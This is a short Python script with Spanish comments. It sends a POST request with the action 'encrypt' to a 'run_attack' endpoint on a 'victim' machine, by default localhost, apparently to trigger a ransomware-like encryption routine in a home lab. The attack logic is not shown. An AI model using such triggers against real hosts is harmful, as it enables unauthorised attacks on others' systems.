import requests

# Si el backend corre en WSL en tu propia máquina:
VICTIM_IP = "localhost"     # o "127.0.0.1"

# Si fuera realmente otra máquina en la red, usarías su IP, por ejemplo:
# VICTIM_IP = "10.74.10.88"

URL = f"http://{VICTIM_IP}:5001/run_attack"

print("[*] Enviando ataque remoto...")
res = requests.post(URL, json={"action": "encrypt"})

print("Código de respuesta:", res.status_code)
print("Respuesta del servidor:")
print(res.text)
